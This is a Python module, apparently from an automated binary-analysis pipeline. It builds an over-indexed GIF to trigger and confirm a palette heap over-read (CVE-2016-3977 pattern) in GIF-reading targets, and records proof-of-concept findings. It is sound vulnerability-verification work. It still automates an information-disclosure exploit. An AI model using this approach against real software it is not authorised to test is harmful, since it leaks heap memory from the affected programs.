"""Stage: drive a GIF palette over-read to L1 + L3, directed, no fuzzing.

A GIF-reading target that indexes its colour table by a pixel value (`Colors[GifRow[j]]`, the
gif2rgb / CVE-2016-3977 shape) is reachable without a campaign: construct the smallest valid GIF
whose colour table is tiny and whose pixel index is out of range (`palette_overread`), detonate it
once against the sanitizer build (L1, a reproduced heap over-read), then drive the NON-instrumented
build over a family of such GIFs to confirm a forgery-proof heap disclosure (L3): the pixel index
is an attacker-chosen read offset, and the out-of-range bytes it discloses to the RGB output vary
with that offset while an in-bounds index returns the known palette entry.

Self-skipping and 0-FP: it runs only on a GIF-reading target, files L1 only on an actual
heap-buffer-overflow READ, and files L3 only when the disclosure oracle confirms.
"""
from __future__ import annotations

import os

from ...db.dao import DynResultDAO, FindingDAO, PocDAO, StringDAO, TargetDAO
from ...jobs.registry import register_stage
from ..dynamic import sandbox
from ..dynamic.stage import (asan_defect_key, crash_dedup_key, crash_finding_candidate,
                             crash_key_parts)
from ..invocation import staged_name as _staged_name
from . import bundle, palette_overread
from .capture import plain_build_bytes

STAGE = "palette_overread"
TOOL = "palette"
TOOL_VERSION = "palette-1"

_GIF_TOKENS = (b"GIF89a", b"GIF87a")


def _reads_gif(ctx, target) -> bool:
    """Does this target parse GIF? True when its strings carry a GIF signature token (the decoder
    compares against it) -- the same evidence the format detector uses to seed a GIF campaign."""
    try:
        for s in StringDAO(ctx.conn).list_by_target(target.id):
            v = getattr(s, "value", None)
            if v and ("GIF89a" in v or "GIF87a" in v):
                return True
    except Exception:                                    # noqa: BLE001 -- gate is best-effort
        pass
    try:
        data = ctx.content.path(target.sha256).read_bytes()
        return any(tok in data for tok in _GIF_TOKENS)
    except Exception:                                    # noqa: BLE001
        return False


def _run(exe, gif_path, target, timeout):
    return sandbox.run(exe, argv=[str(gif_path)], stdin=b"", timeout=timeout,
                       arch=target.arch, endianness=target.endianness, bits=target.bits)


def palette_overread_stage(ctx) -> dict:
    target = TargetDAO(ctx.conn).get(ctx.target_id) if ctx.target_id else None
    if target is None:
        raise ValueError("palette_overread requires a target_id")
    p = ctx.params or {}
    timeout = float(p.get("timeout", 8))

    why = None
    from .. import substrate
    why = (substrate.foreign_cpu_reason(target.arch, target.file_type, sandbox.host_arch(),
                                        "palette over-read")
           or substrate.native_only_reason(target.file_type, "palette over-read"))
    if why:
        ctx.emit("palette.done", payload={"applicable": False, "note": why})
        return {}
    if not _reads_gif(ctx, target):
        ctx.emit("palette.done", payload={"applicable": False,
                                          "note": "target does not parse GIF (no GIF signature)"})
        return {}

    target_bytes = ctx.content.path(target.sha256).read_bytes()
    exe = ctx.scratch() / _staged_name(ctx, target)
    ctx.content.stage_target(target, exe.parent, exe.name)
    os.chmod(exe, 0o755)

    # L1: construct the over-indexed GIF and detonate once against the sanitizer build.
    gif = palette_overread.gif_overindexed(colors=2, index=255, width=64, height=8)
    gpath = ctx.scratch() / "overread.gif"
    gpath.write_bytes(gif)
    ctx.progress(msg="detonating a constructed over-indexed GIF (palette over-read)")
    res = _run(exe, gpath, target, timeout)
    is_oob_read = bool(res.crashed and res.stderr
                       and b"heap-buffer-overflow" in res.stderr and b"READ of size" in res.stderr)
    if not is_oob_read:
        ctx.emit("palette.done", payload={"applicable": True, "crashed": bool(res.crashed),
                 "note": "the constructed GIF did not reproduce a heap over-read READ here"})
        return {}

    mode, argv_base = "file", []
    input_sha = ctx.put_artifact("palette-crash-input", data=gif)
    defect_key = asan_defect_key(res.stderr)
    DynResultDAO(ctx.conn).insert(
        target.id, target.case_id, run_id=ctx.run_id, input_sha=input_sha, input_mode=mode,
        argv=list(argv_base), signal=res.signal, signal_name=res.signal_name, crashed=True,
        isolation=res.isolation, duration_ms=res.duration_ms, fault_pc=res.fault_pc,
        defect_key=defect_key, note="constructed GIF palette over-read; no fuzzing")
    meta = {"target_sha256": target.sha256, "arch": target.arch, "input_mode": mode,
            "argv": argv_base, "expected_signal": res.signal_name, "isolation": res.isolation,
            "verified": True, "level": "L1", "constructed": True, "tool_version": TOOL_VERSION}
    data = bundle.build(target_bytes, gif, meta, res.stderr, mode, argv_base,
                        res.signal_name or "SIGABRT")
    bundle_sha = ctx.put_artifact("poc-bundle", data=data, meta={"verified": True, "level": "L1"})
    poc_id = PocDAO(ctx.conn).insert(target.id, target.case_id, level="L1", verified=True,
                                     signal_name=res.signal_name, input_sha=input_sha,
                                     bundle_sha=bundle_sha)
    fd = FindingDAO(ctx.conn)
    fault_pc, disc, _ = crash_key_parts(ctx.conn, target.id, input_sha)
    fd.upsert(target.id, target.case_id, crash_finding_candidate(
        res.signal_name, input_sha, res.isolation, "palette_overread",
        "(constructed GIF: a pixel index past the colour table -> heap over-read READ; no fuzzing)",
        state="poc-backed", confidence=0.95, bundle_sha=bundle_sha, fault_pc=fault_pc,
        discriminator=disc, file_type=target.file_type))
    fid = fd.id_for_dedup(target.id, crash_dedup_key(res.signal_name, fault_pc, disc))
    if fid:
        PocDAO(ctx.conn).set_finding(poc_id, fid)
    ctx.emit("palette.l1", payload={"level": "L1", "bundle": bundle_sha, "input_sha": input_sha})

    # L3: disclosure on the NON-instrumented build (the sanitizer build poisons the over-read, so it
    # cannot show the leaked bytes; the plain build reads heap and writes it to the RGB output).
    l3 = _try_disclose(ctx, target, gif, bundle_sha, input_sha, fid, timeout)
    ctx.progress(pct=100, msg=f"palette over-read: L1 reproduced{' + L3 disclosure' if l3 else ''}")
    return {"output_shas": [bundle_sha], "output_kind": "poc-bundle"}


def _try_disclose(ctx, target, l1_gif, l1_bundle_sha, l1_input_sha, l1_fid, timeout) -> bool:
    plain = plain_build_bytes(ctx, target)
    if not plain:
        ctx.emit("palette.l3", payload={"ok": False, "need": "plain-build",
                 "note": "no uninstrumented build available to observe the disclosed bytes"})
        return False
    pexe = ctx.scratch() / (_staged_name(ctx, target) + ".plain")
    pexe.write_bytes(plain)
    os.chmod(pexe, 0o755)

    def read_pixel(gif_bytes):
        gp = ctx.scratch() / "disc.gif"
        gp.write_bytes(gif_bytes)
        r = _run(pexe, gp, target, timeout)
        out = getattr(r, "stdout", b"") or b""
        return (out[0], out[1], out[2]) if len(out) >= 3 else None

    verdict = palette_overread.confirm_disclosure(read_pixel)
    if not verdict.get("disclosed"):
        ctx.emit("palette.l3", payload={"ok": False, "verdict": verdict})
        return False

    detail = ("constructed GIF palette over-read discloses heap at an attacker-chosen offset "
              f"(pixel index -> Colors+index*stride): in-bounds index returns the palette entry "
              f"{verdict.get('control')} (negative control); out-of-range indices disclose distinct "
              f"non-palette heap triples {verdict.get('leaked')} in the RGB output. No fuzzing.")
    # The L3 PoC input is the disclosing family's representative GIF; ship it + the evidence.
    disc_gif = palette_overread.gif_overindexed(colors=2, index=160, width=64, height=8)
    disc_sha = ctx.put_artifact("palette-disclose-input", data=disc_gif,
                                meta={"level": "L3", "disclosure": verdict})
    dedup_key = f"CWE-200:palette-disclose:{target.id}"
    ev = [{"channel": "disclosure", "detail": detail},
          {"channel": "poc", "detail": f"verified PoC bundle {l1_bundle_sha[:12]}"}]
    poc_id = PocDAO(ctx.conn).insert(target.id, target.case_id, level="L3", verified=True,
                                     signal_name=None, input_sha=disc_sha, bundle_sha=l1_bundle_sha)
    fd = FindingDAO(ctx.conn)
    fd.upsert(target.id, target.case_id, {
        "cwe": "CWE-200", "severity": "high", "detector": "palette_overread",
        "title": "Information disclosure (demonstrated): palette over-read leaks heap to output",
        "evidence": ev, "function_addr": None, "site_addr": None,
        "dedup_key": dedup_key, "state": "poc-backed", "confidence": 0.95})
    fid = fd.id_for_dedup(target.id, dedup_key)
    if fid:
        PocDAO(ctx.conn).set_finding(poc_id, fid)
    ctx.emit("palette.l3", payload={"ok": True, "level": "L3", "verdict": verdict,
             "input_sha": disc_sha})
    return True


def register() -> None:
    register_stage(STAGE, palette_overread_stage, resource_class="cpu",
                   tool=TOOL, tool_version=TOOL_VERSION, timeout=120)


def enqueue_palette_overread(queue, target, *, params=None, force: bool = True):
    return queue.enqueue(target.case_id, STAGE, target_id=target.id, params=params or {},
                         input_hashes=[target.sha256], tool=TOOL, tool_version=TOOL_VERSION,
                         resource_class="cpu", force=force)
